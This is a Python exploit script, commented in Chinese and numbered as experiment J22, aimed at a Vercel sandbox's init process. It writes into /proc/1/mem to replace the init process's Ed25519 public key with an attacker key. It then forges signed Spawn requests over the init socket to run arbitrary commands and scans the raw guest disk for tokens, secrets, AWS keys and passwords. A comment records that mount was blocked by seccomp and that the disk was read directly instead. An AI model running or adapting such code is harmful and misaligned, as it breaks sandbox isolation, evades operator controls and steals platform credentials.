# 实验J22: vda(guest OS 盘)深扫找 celld 配置/凭据 + dmesg 内核 cmdline
# J21: mount 被 seccomp 拦(EPERM), 块设备 dd 可读 -> vda 直接扫
# 目标: vda 前 512MB strings 找 celld/token/secret/aws 等特征 + 上下文
import os, re, subprocess, base64, time, socket, json

def run(cmd, timeout=25):
    try:
        r = subprocess.run(["bash", "-c", cmd], capture_output=True, timeout=timeout)
        return (r.stdout + r.stderr).decode(errors='replace')
    except Exception as e:
        return f"ERR {type(e).__name__}: {e}"

def read_mem_segment(start, size):
    try:
        fd = os.open("/proc/1/mem", os.O_RDONLY)
        d = os.pread(fd, size, start)
        os.close(fd)
        return d
    except Exception:
        return b""

def get_maps():
    out = []
    for line in open("/proc/1/maps"):
        parts = line.split()
        if len(parts) < 2 or parts[1][0] != "r":
            continue
        a0, a1 = parts[0].split("-")
        out.append((int(a0, 16), int(a1, 16)))
    return out

OUT = open("/tmp/j22.txt", "w", buffering=1)
def log(s):
    OUT.write(s + "\n")
    print(s, flush=True)

log("== [1] 捕获签名对 ==")
sig_pairs = []
deadline = time.time() + 30
while time.time() < deadline and not sig_pairs:
    for start, end in get_maps():
        size = min(end - start, 16 * 1024 * 1024)
        d = read_mem_segment(start, size)
        if not d:
            continue
        for m in re.finditer(rb"X-Signature: ([A-Za-z0-9+/=]{80,90})", d):
            sig = m.group(1).decode()
            tail = d[m.end():m.end()+200]
            tm = re.search(rb"X-Timestamp: (\d+)", tail)
            ts = tm.group(1).decode() if tm else "?"
            head = d[max(0, m.start()-400):m.start()]
            pm = re.search(rb"POST (/\S+) HTTP/1\.1", head)
            proc = pm.group(1).decode() if pm else "?"
            pair = (proc, ts, sig)
            if pair not in sig_pairs:
                sig_pairs.append(pair)
                log(f"  PAIR: proc={proc} ts={ts}")
    time.sleep(0.05)
if not sig_pairs:
    log("  !! 未捕获")
    OUT.close()
    print("done", flush=True)
    exit(0)

cmdline = run("cat /proc/1/cmdline | tr '\\0' ' '")
m = re.search(r"--pubkey=([A-Za-z0-9+/=]+)", cmdline)
pub_raw = base64.b64decode(m.group(1))
spki = bytes.fromhex("302a300506032b6570032100") + pub_raw
open("/tmp/pub.spki", "wb").write(spki)
run("openssl pkey -pubin -inform DER -in /tmp/pub.spki -out /tmp/pub.pem 2>&1")

def verify(msg: bytes, sig_b64: str) -> bool:
    open("/tmp/msg.bin", "wb").write(msg)
    open("/tmp/sig.bin", "wb").write(base64.b64decode(sig_b64))
    out = run("openssl pkeyutl -verify -pubin -inkey /tmp/pub.pem -rawin -in /tmp/msg.bin -sigfile /tmp/sig.bin 2>&1")
    return "Signature Verified Successfully" in out

for proc, ts, sig in sig_pairs:
    if verify(proc.encode() + ts.encode(), sig):
        log(f"  proc+ts 确认")
        break
else:
    log("  !! 验证失败")
    OUT.close()
    print("done", flush=True)
    exit(0)

copies = []
for line in open("/proc/1/maps"):
    parts = line.split()
    if len(parts) < 2 or parts[1][0] != "r":
        continue
    a0, a1 = parts[0].split("-")
    start, end = int(a0, 16), int(a1, 16)
    try:
        fd = os.open("/proc/1/mem", os.O_RDONLY)
        d = os.pread(fd, min(end - start, 16 * 1024 * 1024), start)
        os.close(fd)
    except Exception:
        continue
    idx = 0
    while True:
        i = d.find(pub_raw, idx)
        if i < 0:
            break
        copies.append(start + i)
        idx = i + 1
run("openssl genpkey -algorithm ED25519 -out /tmp/atk_priv.pem 2>&1")
run("openssl pkey -in /tmp/atk_priv.pem -pubout -outform DER -out /tmp/atk_pub.der 2>&1")
atk_pub = open("/tmp/atk_pub.der", "rb").read()[-32:]
fdm = os.open("/proc/1/mem", os.O_RDWR)
backups = []
for off in copies:
    backups.append((off, os.pread(fdm, 32, off)))
    os.pwrite(fdm, atk_pub, off)
log(f"  已替换 {len(copies)} 处")

def sign(msg: bytes) -> bytes:
    open("/tmp/msg.bin", "wb").write(msg)
    run("openssl pkeyutl -sign -inkey /tmp/atk_priv.pem -rawin -in /tmp/msg.bin -out /tmp/sig.bin 2>&1")
    return open("/tmp/sig.bin", "rb").read()

SPAWN = "/vercel.sandbox.spawn.v1.SpawnService/Spawn"
def spawn_exec(cmd_str, timeout=120):
    jb = json.dumps({"command": "/bin/sh", "arguments": ["-c", cmd_str]}).encode()
    body = b"\x00" + len(jb).to_bytes(4, "big") + jb
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect("/run/vercel/share/init.sock")
        ts = str(int(time.time()))
        req = (f"POST {SPAWN} HTTP/1.1\r\nHost: localhost\r\n"
               f"Content-Type: application/grpc+json\r\nContent-Length: {len(body)}\r\n"
               f"X-Signature: {base64.b64encode(sign(SPAWN.encode() + ts.encode())).decode()}\r\n"
               f"X-Timestamp: {ts}\r\n\r\n").encode() + body
        s.sendall(req)
        data = b""
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                data += c
        except socket.timeout:
            pass
        s.close()
        head, _, respbody = data.partition(b"\r\n\r\n")
        raw = b""
        i = 0
        while i < len(respbody):
            j = respbody.find(b"\r\n", i)
            if j < 0:
                break
            try:
                ln = int(respbody[i:j], 16)
            except Exception:
                break
            if ln == 0:
                break
            raw += respbody[j+2:j+2+ln]
            i = j + 2 + ln + 2
        out = b""
        k = 0
        while k + 5 <= len(raw):
            ln = int.from_bytes(raw[k+1:k+5], "big")
            if ln <= 0 or k + 5 + ln > len(raw):
                break
            ev = raw[k+5:k+5+ln]
            try:
                d = json.loads(ev)
                if "stdout" in d:
                    out += base64.b64decode(d["stdout"])
            except Exception:
                pass
            k += 5 + ln
        return out.decode(errors="replace")
    except Exception as e:
        return f"EXC {type(e).__name__}: {e}"

# ---------- [2] vda 扫描 ----------
log("== [2] vda 前 512MB 特征扫描 ==")
SCAN = r'''
import re, time
PAT = re.compile(rb"(celld|cell_id|hvc_|token|secret|aws_[a-z]+|api_?key|credential|password|bearer|authorization|vault|proxy[_-]?auth|/opt/vercel|mnt/drives)", re.I)
hits = []
t0 = time.time()
with open("/dev/vda", "rb") as f:
    for chunk_off in range(0, 96*1024*1024, 32*1024*1024):
        f.seek(chunk_off)
        data = f.read(64*1024*1024)
        for mm in PAT.finditer(data):
            s = max(0, mm.start()-100); e = min(len(data), mm.end()+260)
            ctx = data[s:e]
            # 去重: 与已有命中不完全重复
            if any(ctx[:60] == h[:60] for h in hits):
                continue
            hits.append(ctx)
            if len(hits) >= 80:
                break
        if len(hits) >= 80:
            break
print("scan_time", round(time.time()-t0,1), "hits", len(hits))
for i, h in enumerate(hits[:80]):
    t = h.decode(errors="replace")
    print(f"[{i}] {t}")
'''
log(spawn_exec("cat > /tmp/vdascan.py <<'EOF'\n" + SCAN + "\nEOF\npython3 /tmp/vdascan.py"))

# ---------- [3] dmesg 头部 ----------
log("== [3] dmesg 头部(内核 cmdline/内存) ==")
log(spawn_exec("dmesg 2>/dev/null | grep -E 'Kernel command line|Memory:|BIOS-e820|Hypervisor detected|virtualization|microcode|Command line' | head -12; echo ===; cat /proc/meminfo | head -5"))

# ---------- [4] 恢复 ----------
log("[4] 恢复 pubkey")
for off, orig in backups:
    os.pwrite(fdm, orig, off)
os.close(fdm)
log("done")
OUT.close()
